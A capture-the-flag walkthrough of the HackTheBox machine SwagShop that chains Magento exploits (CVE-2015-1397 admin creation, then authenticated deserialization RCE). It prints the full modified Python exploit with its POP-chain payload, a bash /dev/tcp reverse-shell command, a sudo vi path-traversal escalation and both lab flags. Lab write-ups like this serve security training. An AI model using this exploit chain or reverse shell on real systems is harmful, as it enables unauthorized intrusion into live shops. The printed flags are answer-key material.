---
title: HackTheBox - SwagShop
date: 2020-12-26 18:10:00 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy, Magento, e-commerce, SQLi, chaining exploits, fixing exploit, linpeas, sudo misconfiguration, vi, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/SwagShop.png
---

## Foothold

### `nmap` scan (open ports)

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN SwagShop-full-port-scan.txt 10.10.10.140
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Apache 2.4.18 (port 80) | Magento (open source e-commerce)

[http://10.10.10.140/](http://10.10.10.140/) seems to be an online shop with a **Magento** backend:

![shop](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/shop.png)

2014 is the last time the website was edited?! 

By navigating through the website, there is something strange that we can notice, directories are prefixed with `/index.php/`. This is probably due to **apache mod-rewrite misconfiguration**:

![strange](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/strange.png)

Thereby, I ran `dirb`:

![dirb](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/dirb.png)

And we found an admin panel on [http://10.10.10.140/index.php/admin](http://10.10.10.140/index.php/admin):

![admin-panel](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/admin-panel.png)

#### exploit creates admin account  

Despite the fact that I don't know the version yet, I've researched some exploits but either they are outdated _(if we refer to the 2014 copyright)_, or they require authentication credentials, or they target specific magento plugins.

Except for this one [Magento eCommerce - Remote Code Execution](https://www.exploit-db.com/exploits/37977). I just changed line 5 and 13 because of the `/index.php` prefix:

![rce](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/rce.png)

An it worked:

![worked](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/worked.png)

I logged in and I didn't understand why I was redirected to this page first:

![png](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/png.png)

Then I changed the URL to [http://10.10.10.140/index.php/admin](http://10.10.10.140/index.php/admin) and I was redirected to the Magento's admin dashboard:

![magento-admin-panel](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/magento-admin-panel.png)

#### `magescan`

At this point, I looked for _"magento scanners"_ and I found this [one](https://github.com/steverobbins/magescan) (`magescan`):

![magescan-2](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/magescan-2.png)

![magescan-1](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/magescan-1.png)

If we take a look at this URL that the scanner found &rarr; [http://10.10.10.140/app/etc/local.xml](http://10.10.10.140/app/etc/local.xml), we get mysql credentials in clear text:

![credentials](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/creds.png)

#### exploit remote code execution

Now that we know the version, we can take a look at the exploit which requires authentication: [Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution ](https://www.exploit-db.com/exploits/37811)

We fill these lines with the credentials created by the previous exploit, and the install date we saw on [http://10.10.10.140/app/etc/local.xml](http://10.10.10.140/app/etc/local.xml):

![exploit 2 args](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/exploit-2-help.png)

![config exploit 2](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/exploit-2-config.png)

Then I encountered this error:

![error 2 exploit 2](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/exploit-2-error-2.png)

I had to change line containing:

```python
request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
```

into:

![](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/2y.png)

Exploit after updates:

```python
from hashlib import md5
import sys
import re
import base64
import mechanize


def usage():
    print "Usage: python %s <target> <argument>\nExample: python %s http://localhost \"uname -a\""
    sys.exit()


if len(sys.argv) != 3:
    usage()

# Command-line args
target = sys.argv[1]
arg = sys.argv[2]

# Config.
username = 'forme'
password = 'forme'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(arg), arg)
# Setup the mechanize browser and options
br = mechanize.Browser()
#br.set_proxies({"http": "localhost:8080"})
br.set_handle_robots(False)

request = br.open(target)

br.select_form(nr=0)
br.form.fixup()
br['login[username]'] = username
br['login[password]'] = password

br.method = "POST"
request = br.submit()
content = request.read()

url = re.search("ajaxBlockUrl = \'(.*)\'", content)
url = url.group(1)
key = re.search("var FORM_KEY = '(.*)'", content)
key = key.group(1)

request = br.open(url + 'block/tab_orders/period/2y/?isAjax=true', data='isAjax=false&form_key=' + key)

tunnel = re.search("src=\"(.*)\?ga=", request.read())
tunnel = tunnel.group(1)

payload = base64.b64encode(payload)
gh = md5(payload + install_date).hexdigest()

exploit = tunnel + '?ga=' + payload + '&h=' + gh

try:
    request = br.open(exploit)
except (mechanize.HTTPError, mechanize.URLError) as e:
    print e.read()
```

Finally the exploit worked:

![exploit worked](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/success.png)

## Reverse shell (`www-data`)

```bash
$ python 37811.py http://10.10.10.140/index.php/admin/ "bash -c 'bash -i >&/dev/tcp/10.10.14.7/4444 0>&1'"
```

![sh](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/sh.png)

![reverse-shell](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/reverse-shell.png)

Now that we have an acces to the machine's shell, let's do enumeration with **linpeas.sh**:

![sudo -l](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/linpeas.png)

Thanks to this misconfiguration with the wildcard we can read both user and root flags, using `vi` as follows:

## User (`haris`)

```bash
$ sudo /usr/bin/vi /var/www/html/../../../home/haris/user.txt
```

![harris](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/haris.png)

- flag: `a448877277e82f05e5ddf9f90aefbac8`

## Root

```bash
$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
```

![root](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/swagshop/root.png)

- flag: `c2b087d66e14a652a3b86a130ac56721`
___

## Useful links

- [CVE-2015-1397](https://nvd.nist.gov/vuln/detail/CVE-2015-1397)
- [Magento eCommerce - Remote Code Execution](https://www.exploit-db.com/exploits/37977)
- [Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution ](https://www.exploit-db.com/exploits/37811)